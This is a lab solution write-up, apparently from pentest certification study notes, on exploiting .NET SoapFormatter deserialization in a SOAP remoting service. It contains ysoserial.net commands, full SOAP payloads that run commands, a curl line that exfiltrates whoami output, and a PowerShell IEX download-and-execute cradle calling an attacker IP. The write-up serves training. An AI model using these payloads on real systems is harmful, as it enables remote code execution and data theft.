+<p>Below, you can find solutions for each task. Remember though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p>
+
+<p>Task 1. Perform reconnaissance and find a soap-based web service</p>
+
+<p>A port scan reveals two possible candidates (see below).</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-p-</span> demo.ine.local <span class="nt">-T4</span> <span class="nt">--open</span> <span class="nt">-v</span> <span class="nt">-Pn</span>
+</code></pre></div></div>
+
+<p>The results are:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Not shown: 62690 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 2831 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1234/tcp  open  http               MS .NET Remoting httpd <span class="o">(</span>.NET CLR 4.0.30319.42000<span class="o">)</span>
+3389/tcp  open  ssl/ms-wbt-server?
+5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49160/tcp open  msrpc              Microsoft Windows RPC
+49192/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<p>Examining the service on port 80 shows a frame that fails to be loaded.</p>
+
+<p>The service on port 1234 reacts to a simple SOAP message.</p>
+
+<blockquote>
+  <p>[Note] That it is a valid service endpoint, since when requesting an incorrect path the error mentions <strong>Requested Service not found</strong>.</p>
+</blockquote>
+
+<p>Task 2. Execute code on remote machine</p>
+
+<p>Lets use ysoserial.net to generate a payload in SoapFormat, in an attempt to identify if the remote service is vulnerable.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Note that you might need to remove <span class="se">\&lt;</span>SOAP:Body&gt; tags from the resulting payload before testing.
+</code></pre></div></div>
+
+<p>Also note that you need a Windows OS on which you will run the ysoserial.net binary with the below command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe <span class="nt">-f</span> SoapFormatter <span class="nt">-g</span> TextFormattingRunProperties <span class="nt">-c</span> <span class="s2">"cmd /c [command]"</span> <span class="nt">-o</span> raw
+</code></pre></div></div>
+
+<p>The .NET serialization protocol in this case does not verify the length of the command string, it will thus be possible to interfere with it after generating the payload. The payload is then copied to Burp with the following changes:</p>
+
+<ul>
+  <li>
+    <p>As said before, Soap Body tags should be removed</p>
+  </li>
+  <li>
+    <p>In order to have a valid soap message, a dummy SOAPAction header is required. This is related to SOAP and not related to this specific lab</p>
+  </li>
+  <li>
+    <p>The content type should be text/xml like in every SOAP request</p>
+  </li>
+  <li>
+    <p>If you are receiving an error stating <strong>Requested service was not found</strong>, you might also need to clear some whitespaces / newlines</p>
+  </li>
+</ul>
+
+<p>Blind Code execution can be confirmed, for example, using ping.</p>
+
+<p>For that, we need the IP address of the attacker machine:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr
+</code></pre></div></div>
+
+<p>Request:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /VulnerableEndpoint.rem HTTP/1.1
+Host: demo.ine.local:1234
+SOAPAction: something
+Content-type: text/xml
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Referer: http://demo.ine.local/
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age<span class="o">=</span>0
+Content-Length: 1478
+
+&lt;SOAP-ENV:Envelope xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+                   xmlns:xsd<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema"</span>
+                   xmlns:SOAP-ENC<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/encoding/"</span>
+                   xmlns:SOAP-ENV<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span>
+                   xmlns:clr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/soap/encoding/clr/1.0"</span>
+                   SOAP-ENV:encodingStyle<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="o">&gt;</span>
+  &lt;a1:TextFormattingRunProperties <span class="nb">id</span><span class="o">=</span><span class="s2">"ref-1"</span>
+                                  xmlns:a1<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35"</span><span class="o">&gt;</span>
+    &lt;ForegroundBrush <span class="nb">id</span><span class="o">=</span><span class="s2">"ref-3"</span><span class="o">&gt;</span>
+      &amp;lt<span class="p">;</span>ResourceDictionary
+        <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>
+        xmlns:x<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/winfx/2006/xaml"</span>
+        xmlns:System<span class="o">=</span><span class="s2">"clr-namespace:System;assembly=mscorlib"</span>
+        xmlns:Diag<span class="o">=</span><span class="s2">"clr-namespace:System.Diagnostics;assembly=system"</span>&amp;gt<span class="p">;</span>
+        &amp;lt<span class="p">;</span>ObjectDataProvider x:Key<span class="o">=</span><span class="s2">""</span> <span class="nv">ObjectType</span><span class="o">=</span><span class="s2">"{x:Type Diag:Process}"</span> <span class="nv">MethodName</span><span class="o">=</span><span class="s2">"Start"</span> &amp;gt<span class="p">;</span>
+          &amp;lt<span class="p">;</span>ObjectDataProvider.MethodParameters&amp;gt<span class="p">;</span>
+            &amp;lt<span class="p">;</span>System:String&amp;gt<span class="p">;</span>cmd&amp;lt<span class="p">;</span>/System:String&amp;gt<span class="p">;</span>
+            &amp;lt<span class="p">;</span>System:String&amp;gt<span class="p">;</span><span class="s2">"/c ping 10.10.27.2"</span>&amp;lt<span class="p">;</span>/System:String&amp;gt<span class="p">;</span>
+          &amp;lt<span class="p">;</span>/ObjectDataProvider.MethodParameters&amp;gt<span class="p">;</span>
+        &amp;lt<span class="p">;</span>/ObjectDataProvider&amp;gt<span class="p">;</span>
+      &amp;lt<span class="p">;</span>/ResourceDictionary&amp;gt<span class="p">;</span>
+    &lt;/ForegroundBrush&gt;
+  &lt;/a1:TextFormattingRunProperties&gt;
+&lt;/SOAP-ENV:Envelope&gt;
+
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to place the IP address of your attacker machine in the above command.</p>
+</blockquote>
+
+<p>Before sending the above request, use the following command to listen for ICMP requests/replies:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump <span class="nt">-i</span> any icmp
+</code></pre></div></div>
+
+<p>Send the request to the vulnerable SOAP endpoint:</p>
+
+<p>By the time the crafted request is sent, we can notice ICMP traffic reaching our sniffer from the remote target!</p>
+
+<p>Task 3. Get command output using an out-of-band channel</p>
+
+<p>There are many methods to achieve that goal. We will do the task using PowerShell. First, we will create the following snippet and then host it using Python’s SimpleHTTPServer module.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$c</span><span class="o">=</span><span class="nb">whoami</span><span class="p">;</span>curl http://10.10.27.2:445/<span class="nv">$c</span>
+python3 <span class="nt">-m</span> http.server 445
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to place the IP address of your attacker machine in the above command.</p>
+</blockquote>
+
+<p>And finally, the following command is injected into the serialized payload:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-C</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')"</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to place the IP address of your attacker machine in the above command.</p>
+</blockquote>
+
+<p>The request for out-of-band data exfiltration via command execution is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /VulnerableEndpoint.rem HTTP/1.1
+Host: demo.ine.local:1234
+SOAPAction: something
+Content-type: text/xml
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Referer: http://demo.ine.local/
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age<span class="o">=</span>0
+Content-Length: 1478
+
+&lt;SOAP-ENV:Envelope xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+                   xmlns:xsd<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema"</span>
+                   xmlns:SOAP-ENC<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/encoding/"</span>
+                   xmlns:SOAP-ENV<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/envelope/"</span>
+                   xmlns:clr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/soap/encoding/clr/1.0"</span>
+                   SOAP-ENV:encodingStyle<span class="o">=</span><span class="s2">"http://schemas.xmlsoap.org/soap/encoding/"</span><span class="o">&gt;</span>
+  &lt;a1:TextFormattingRunProperties <span class="nb">id</span><span class="o">=</span><span class="s2">"ref-1"</span>
+                                  xmlns:a1<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35"</span><span class="o">&gt;</span>
+    &lt;ForegroundBrush <span class="nb">id</span><span class="o">=</span><span class="s2">"ref-3"</span><span class="o">&gt;</span>
+      &amp;lt<span class="p">;</span>ResourceDictionary
+        <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>
+        xmlns:x<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/winfx/2006/xaml"</span>
+        xmlns:System<span class="o">=</span><span class="s2">"clr-namespace:System;assembly=mscorlib"</span>
+        xmlns:Diag<span class="o">=</span><span class="s2">"clr-namespace:System.Diagnostics;assembly=system"</span>&amp;gt<span class="p">;</span>
+        &amp;lt<span class="p">;</span>ObjectDataProvider x:Key<span class="o">=</span><span class="s2">""</span> <span class="nv">ObjectType</span><span class="o">=</span><span class="s2">"{x:Type Diag:Process}"</span> <span class="nv">MethodName</span><span class="o">=</span><span class="s2">"Start"</span> &amp;gt<span class="p">;</span>
+          &amp;lt<span class="p">;</span>ObjectDataProvider.MethodParameters&amp;gt<span class="p">;</span>
+            &amp;lt<span class="p">;</span>System:String&amp;gt<span class="p">;</span>cmd&amp;lt<span class="p">;</span>/System:String&amp;gt<span class="p">;</span>
+            &amp;lt<span class="p">;</span>System:String&amp;gt<span class="p">;</span><span class="s2">"/c powershell -exec Bypass -C </span><span class="se">\"</span><span class="s2">IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')</span><span class="se">\"</span><span class="s2">"</span>&amp;lt<span class="p">;</span>/System:String&amp;gt<span class="p">;</span>
+          &amp;lt<span class="p">;</span>/ObjectDataProvider.MethodParameters&amp;gt<span class="p">;</span>
+        &amp;lt<span class="p">;</span>/ObjectDataProvider&amp;gt<span class="p">;</span>
+      &amp;lt<span class="p">;</span>/ResourceDictionary&amp;gt<span class="p">;</span>
+    &lt;/ForegroundBrush&gt;
+  &lt;/a1:TextFormattingRunProperties&gt;
+&lt;/SOAP-ENV:Envelope&gt;
+
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to place the IP address of your attacker machine in the above request.</p>
+</blockquote>
+
+<p>Send the above request from Burp Suite:</p>
+
+<blockquote>
+  <p>We can see the output of the <strong>whoami</strong> command being transmitted in the HTTP GET parameter.</p>
+</blockquote>
+
+<blockquote>
+  <p>This is because PowerShell fetched the remote resource and then immediately executed it using the IEX command. Note that we haven’t even touched the filesystem!</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-02T00:00:00+06:00">December 2, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=10+-+Attacking+Serialization%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fzattackingserialization%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fzattackingserialization%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fzattackingserialization%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/xmlattacks/" class="pagination--pager" title="9 - XML Attacks
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/serverside/" class="pagination--pager" title="11 - Server Side Attacks
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
